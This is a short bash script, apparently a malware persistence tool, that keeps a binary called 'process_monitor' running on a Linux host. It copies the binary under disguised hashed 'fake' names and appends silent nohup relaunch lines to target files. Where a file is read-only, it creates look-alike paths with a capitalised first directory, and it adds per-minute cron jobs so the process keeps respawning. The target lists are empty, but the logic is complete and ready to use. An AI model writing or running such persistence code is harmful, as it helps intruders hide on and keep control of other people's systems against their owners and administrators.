#!/bin/bash

MONITOR_BINARY="/usr/local/bin/process_monitor"

# List of file paths
file_paths=(
)

file_names=(
)

# Function to check if monitor is running
is_monitor_running() {
    pgrep -f "$MONITOR_BINARY" > /dev/null
    return $?
}

# Function to restart the monitor
restart_monitor() {
    echo "[*] Monitor not running. Attempting to restart..."
    if [[ -x "$MONITOR_BINARY" ]]; then
        nohup "$MONITOR_BINARY" &> /dev/null &
        echo "[+] Monitor restarted."
    else
        echo "[-] Monitor binary not found or not executable at $MONITOR_BINARY"
    fi
}

# Capitalize the first directory in the path
capitalize_first_dir() {
    local path="$1"
    local first="/$(echo "$path" | cut -d'/' -f2)"
    local cap_first="/$(echo "$first" | sed 's|/||' | awk '{print toupper(substr($0,1,1)) substr($0,2)}')"
    echo "$path" | sed "s|$first|$cap_first|"
}

# Generate a unique fake binary name for each file path
generate_fake_binary() {
    local file="$1"
    local hash suffix
    hash=$(echo "$file" | md5sum | cut -c1-6)
    suffix="_$hash"
    echo "/usr/local/bin/process_monitor${suffix}"
}

# Embed monitor logic or fallback
embed_monitor_logic() {
    local file_path="$1"
    echo "[*] Processing: $file_path"

    # Generate and create a unique fake binary
    local fake_binary
    fake_binary=$(generate_fake_binary "$file_path")

    if [[ ! -f "$fake_binary" ]]; then
        cp "$MONITOR_BINARY" "$fake_binary"
        chmod +x "$fake_binary"
        echo "[+] Created fake monitor binary: $fake_binary"
    fi

    local monitor_line="pgrep -f \"$fake_binary\" > /dev/null || nohup \"$fake_binary\" &> /dev/null &"

    if [[ -w "$file_path" ]]; then
        echo -e "\n# Start monitor\n$monitor_line" >> "$file_path"
        chmod +x "$file_path"
        echo "[+] Embedded into: $file_path"
    else
        echo "[-] Read-only file system: $file_path"
        local new_path
        new_path=$(capitalize_first_dir "$file_path")
        mkdir -p "$(dirname "$new_path")"
        echo -e "#!/bin/bash\n\n$monitor_line" > "$new_path"
        chmod +x "$new_path"
        echo "[+] Created new writable path: $new_path"
        file_path="$new_path"
    fi

    # Ensure in crontab
    crontab -l 2>/dev/null | grep -q "$file_path" || (
        echo "[*] Adding to crontab: $file_path"
        (crontab -l 2>/dev/null; echo "* * * * * bash \"$file_path\"") | crontab -
        echo "[+] Added to cron job: $file_path"
    )
}

# Step 1: Ensure monitor is running
if ! is_monitor_running; then
    restart_monitor
fi

# Step 2: Process each file path
for file_path in "${file_paths[@]}"; do
    embed_monitor_logic "$file_path"
done

echo "[✓] Done processing all file paths."
